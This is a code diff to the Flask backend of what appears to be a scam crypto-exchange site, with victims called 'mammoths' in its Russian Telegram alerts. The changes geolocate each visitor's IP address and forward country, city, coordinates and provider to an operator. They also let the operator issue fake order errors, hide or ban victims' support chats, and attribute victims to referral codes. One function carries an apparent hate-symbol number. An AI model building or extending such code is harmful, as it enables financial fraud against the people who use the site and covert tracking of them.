@@ -52,11 +52,19 @@ def send_message():
     return {"status": "message sent"}
 
 
-# @app.route('/send-error', methods=['POST'])
+# @app.route("/send-error", methods=["POST"])
 # def send_error():
-#    transID = request.json.get('transID')
-#    socketio.emit(f'err_redirect_user_{transID}')
-#    return {'status': 'error sent'}
+#    transID = request.json.get("transID")
+#    socketio.emit(f"redirect_user_{transID}")
+#    return {"status": "error sent"}
+
+
+@app.route("/hideChat", methods=["POST"])
+def hideChat1488():
+    userId = request.json.get("id")
+    socketio.emit(f"hideChat_{userId}")
+    return {"status": True}
+
 
 # @app.route('/static/<svgFile>')
 # def serve_content(svgFile):
@@ -116,26 +124,55 @@ def show_index1():
 @app.route("/user/<id>", methods=["GET"])
 def getUser(id):
     user_ip = request.headers.get("X-Forwarded-For")
+    # ua = request.headers.get("User-Agent")
+    if user_ip != None:
+        data = requests.get(
+            f"http://ip-api.com/json/{user_ip}",
+        ).text
+        data = json.loads(data)
+        country = data["country"]
+        city = data["city"]
+        cords = data["lat"], data["lon"]
+        ans = data["as"]
+    else:
+        city = "undefined"
+        cords = "undefined"
+        ans = "undefined"
+        country = "undefined"
+
     online = "true"
-    telegram_message = f" 🦣 Мамонт перешел на сайт \n 🌐 IP: {user_ip}"
+    telegram_message = f""" 🦣 Мамонт перешел на сайт \n 🌐 IP: <code>{user_ip}</code>\n 
+🔭 Страна: <code>{country}</code>
+--
+🏢 Город: <code>{city}</code>
+--
+📍 Координаты: <code>{cords}</code>
+--
+📡 Провайдер: <code>{ans}</code>
+--
+🔎 ID На сайте: <code>{id}</code>
+"""
     inline_keyboard = {
         "inline_keyboard": [
-            [{"text": "Ответить", "callback_data": f"uans_{id}"}]
+            [{"text": "Ответить в ТП", "callback_data": f"uans_{id}"}],
+            # [{"text": "Кинуть в бан на 6 часов", "callback_data": f"cloak_{user_ip}"}],
             # [{'text': 'Онлайн?', 'callback_data': f'uans_{id}'}],
-            # [{'text': 'Удалить ТП', 'callback_data': f'uans_{id}'}]
+            # [{"text": "Удалить ТП", "callback_data": f"uans_{id}"}]
         ]
     }
 
-    if str(id).isdigit():
+    if str(id).isdigit() and len(str(id)) == 8:
+        chatbanned = db_api.checkForBan(id)
         send_telegram_message(telegram_message, inline_keyboard)
         # response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':adminId,}), headers=headers)
-        return jsonify(id=int(id))
+        return jsonify(id=int(id), chatbanned=chatbanned)
     else:
+        chatbanned = "0"
         id = db_api.getId()
-        db_api.registerUser(id, user_ip, online)
+        db_api.registerUser(id, user_ip, online, chatbanned)
         send_telegram_message(telegram_message, inline_keyboard)
         # response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':adminId,'text': f'мамонт перешел на сайт \n IP:[{user_ip}]\n ID:[{id}]'}), headers=headers)
-        return jsonify(id=id)
+        return jsonify(id=id, chatbanned=chatbanned)
 
 
 @app.route("/transactions", methods=["GET"])
@@ -208,6 +245,7 @@ def confirm(orderId):
     inline_keyboard = {
         "inline_keyboard": [
             [{"text": "Подтвердить", "callback_data": f"confirm_{orderId}"}],
+            [{"text": "Выдать ошибку", "callback_data": f"custErr_{orderId}"}],
         ]
     }
     if "e" in str(sendAmount).lower():
@@ -228,47 +266,57 @@ def confirm(orderId):
     elif str(referalCode) == "null":
         send_telegram_message(telegram_message, inline_keyboard)
         # response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':adminId}), headers=headers)
-    return jsonify(status="confirmed")
+    return jsonify(status=status)
 
 
 @app.route("/confirm/<orderId>/passed", methods=["POST"])
 def passOrder(orderId):
     db_api.changeStatusToReturned(orderId)
-    telegram_message = f"Заявка мамонта помечена как успешная {orderId}"
+    telegram_message = (
+        f"<b>Заявка мамонта помечена как успешная для</b> <code>{orderId}</code>"
+    )
     inline_keyboard = {}
     send_telegram_message(telegram_message, inline_keyboard)
     return jsonify(status="passed")
 
 
+@app.route("/confirm/<orderId>/error", methods=["POST"])
+def errOrder(orderId):
+    db_api.changeStatusToErr(orderId)
+    telegram_message = f"<b>Кастомная ошибка для</b> <code>{orderId}</code>"
+    inline_keyboard = {}
+    send_telegram_message(telegram_message, inline_keyboard)
+    return jsonify(status="error")
+
+
+@app.route("/msgHistory/<id>/removeChat", methods=["POST"])
+def hideChat(id):
+    db_api.chatBan(id)
+    telegram_message = f"Чат спрятан! {id}"
+    inline_keyboard = {}
+    send_telegram_message(telegram_message, inline_keyboard)
+    return jsonify(status="hidden")
+
+
 @app.route("/msgSave/<text>/<userId>/<timestamp>/<user>", methods=["POST"])
 def msgSave(text, userId, timestamp, user):
     # Пример использования функции send_telegram_message
-    telegram_message = f"💬 Сообщение в ТП от пользователя {userId}\n\n{text}"
+    telegram_message = (
+        f"💬 Сообщение в ТП от пользователя <code>{userId}</code>\n\n{text}"
+    )
     inline_keyboard = {
         "inline_keyboard": [
             [{"text": "Ответить", "callback_data": f"uans_{userId}"}],
             [{"text": "Очистить чат", "callback_data": f"rmchat_{userId}"}],
+            [{"text": "Удалить ТП", "callback_data": f"hideChat_{userId}"}],
         ]
     }
-
-    send_telegram_message(telegram_message, inline_keyboard)
-    db_api.addMsg(text, userId, timestamp, user)
+    if len(userId) == 8 and str(userId).isdigit():
+        db_api.addMsg(text, userId, timestamp, user)
+        send_telegram_message(telegram_message, inline_keyboard)
+    else:
+        pass
     return jsonify(reponse="success")
-
-
-def send_telegram_message(message, inline_keyboard):
-    telegram_api_url = tgbotUrl
-    chat_ids = [adminId]
-    headers = {"Content-Type": "application/json"}
-    for chat_id in chat_ids:
-        payload = {"chat_id": chat_id, "text": message, "reply_markup": inline_keyboard}
-        response = requests.post(
-            telegram_api_url, data=json.dumps(payload), headers=headers
-        )
-        if response.status_code == 200:
-            print("Message sent successfully.")
-        else:
-            print("Failed to send message. Error:", response.text)
 
 
 @app.route("/msgHistory/<id>", methods=["GET"])
@@ -348,21 +396,23 @@ def newOrder(
     if "e" in str(receiveAmount).lower():
         receiveAmount = float(receiveAmount)
         receiveAmount = format(receiveAmount, "f")
-    payload = f"🤑 Мамонт создал заявку\nРефка: {referalCode}\n\n{sendAmount} {sendCurrency} -> {receiveAmount} {receiveCurrency}\n{email}\n{status}"
+
     inline_keyboard = {
         "inline_keyboard": [
             [{"text": "Ответить", "callback_data": f"uans_{id}"}]
             # [{'text': 'Онлайн?', 'callback_data': f'uans_{id}'}],
-            # [{'text': 'Удалить ТП', 'callback_data': f'uans_{id}'}]
+            #
         ]
     }
-    if str(referalCode) != "null":
+    if db_api.checkRefIfValid(referalCode) == True:
+        payload = f"🤑 Мамонт создал заявку\nРефка: <code>{referalCode}</code>\n\n{sendAmount} {sendCurrency} -> {receiveAmount} {receiveCurrency}\n{email}\n{status}"
         # id = db_api.getUserId(referalCode)
         # id2 = adminId
         # response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':id}), headers=headers)
         # response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':id2}), headers=headers)
         send_telegram_message(payload, inline_keyboard)
-    elif str(referalCode) == "null":
+    elif db_api.checkRefIfValid(referalCode) == False:
+        payload = f"🤑 Мамонт создал заявку без рефки\n\n\n{sendAmount} {sendCurrency} -> {receiveAmount} {receiveCurrency}\n{email}\n{status}"
         # If referalCode is 'null', send to a single, specific ID
         # id = adminId  # replace with actual ID for null referal code
         # response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id': id}), headers=headers)
@@ -383,6 +433,26 @@ def newOrder(
     # else:
     #    print('Failed to send message. Error:', response.text)
     return jsonify(orderId=orderIdd)
+
+
+def send_telegram_message(message, inline_keyboard):
+    telegram_api_url = tgbotUrl
+    chat_ids = [adminId]
+    headers = {"Content-Type": "application/json"}
+    for chat_id in chat_ids:
+        payload = {
+            "chat_id": chat_id,
+            "text": message,
+            "reply_markup": inline_keyboard,
+            "parse_mode": "html",
+        }
+        response = requests.post(
+            telegram_api_url, data=json.dumps(payload), headers=headers
+        )
+        if response.status_code == 200:
+            print("Message sent successfully.")
+        else:
+            print("Failed to send message. Error:", response.text)
 
 
 def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
